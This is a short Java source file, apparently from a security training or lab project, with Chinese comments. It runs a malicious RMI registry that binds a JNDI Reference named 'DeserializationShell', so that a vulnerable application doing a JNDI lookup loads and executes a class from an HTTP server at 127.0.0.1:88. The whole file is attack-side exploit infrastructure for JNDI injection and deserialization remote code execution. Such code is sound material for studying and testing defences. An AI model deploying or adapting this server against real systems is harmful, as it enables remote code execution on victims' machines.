package top.whgojp.modules.deserialize;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception {
        // 指定 HTTP 服务器 URL
        String url = "http://127.0.0.1:88/";

        // 创建 RMI 注册表
        Registry registry = LocateRegistry.createRegistry(1099);

        // 创建 JNDI Reference，指向远程加载的类 DeserializationShell
        Reference reference = new Reference("DeserializationShell", "DeserializationShell", url);

        // 包装为 ReferenceWrapper
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);

        // 绑定到 RMI 注册表
        registry.bind("DeserializationShell", referenceWrapper);

        System.out.println("RMI 服务运行中...");
    }

}
